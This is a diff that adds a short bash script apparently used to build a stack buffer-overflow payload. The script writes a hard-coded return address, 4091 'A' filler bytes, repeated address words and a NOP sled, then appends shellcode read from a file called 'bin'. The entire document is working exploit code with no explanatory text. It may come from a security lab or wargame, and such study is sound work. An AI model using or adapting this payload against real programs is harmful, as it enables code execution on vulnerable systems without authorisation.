@@ -1,0 +1,19 @@
+#!/bin/bash
+FIRST_BUFFER_TIMES=4091
+SECOND_BUFFER_TIMES=14 
+/bin/echo -ne '\xc0\xe6\xff\xbf'
+python -c "import sys; sys.stdout.write(\"A\" * $FIRST_BUFFER_TIMES);"
+#python -c "import sys; sys.stdout.write(\"\x90\" * (4096 - $FIRST_BUFFER_TIMES - 1));"
+/bin/echo '' 
+
+
+python -c "import sys; sys.stdout.write(\"\xbf\xc0\xe6\xff\" * $SECOND_BUFFER_TIMES);"
+/bin/echo -ne '\xc0\xe6\xff\xbf'
+
+/bin/echo ''
+
+python -c "import sys; sys.stdout.write(\"\x90\" * (4096 - $SECOND_BUFFER_TIMES - 1 - `cat bin | wc -c` - 4 - 2500));"
+cat bin
+
+
+
